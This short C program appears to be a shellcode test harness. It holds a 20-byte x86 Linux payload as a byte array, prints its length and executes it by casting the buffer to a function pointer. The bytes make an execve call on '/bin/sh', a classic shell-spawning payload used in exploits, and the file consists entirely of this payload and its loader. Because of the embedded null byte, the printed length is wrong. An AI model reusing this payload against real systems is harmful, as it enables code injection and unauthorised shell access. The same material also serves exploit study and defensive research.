#include<stdio.h>
#include<string.h>

unsigned char buf[] = 
"\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62"
"\x69\x6e\x89\xe3\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(buf));

	int (*ret)() = (int(*)())buf;

	ret();
}

	
